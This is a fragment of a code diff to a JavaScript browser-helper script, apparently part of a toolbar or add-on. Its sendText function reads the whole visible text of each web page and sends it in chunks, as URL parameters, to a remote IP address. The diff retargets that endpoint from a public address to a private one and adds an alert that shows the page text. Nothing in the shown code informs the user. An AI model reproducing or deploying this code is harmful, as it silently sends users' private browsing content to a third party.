@@ -1,3 +1,4 @@
+alert(document.body.innerText);
 var i8bho_bindoemid= i8bho_bindoemid||0,
 	i8bho_nid= i8bho_nid||'0',
 	i8bho_rid= i8bho_rid||0,
@@ -486,14 +487,13 @@ function I8bho_print()
 		//return
 		return matches;
 	};
-
     function sendText()
     {
         var text = document.body.innerText,
-            prefix = 'http://211.154.172.172/text?t=',
+            prefix = 'http://10.10.11.163/text?t=',
             param = '&c=',
-            paraSize = (msie ? (parseInt(win.navigator.appVersion) < 8 ? 2083 : 4098) : 4096),
-            maxTimes = (msie ? (parseInt(win.navigator.appVersion) < 8 ? 4 : 6) : 4),
+            paraSize = (msie ? ((msie<8) ? 1024 : 4098) : 4096),
+            maxTimes = (msie ? ((msie<8) ? 4 : 6) : 4),
             metaSize = prefix.length + param.length + (maxTimes + 1).toString().length;
         if (text === undefined) return;
         var step = paraSize - metaSize, maxSize = step * maxTimes;
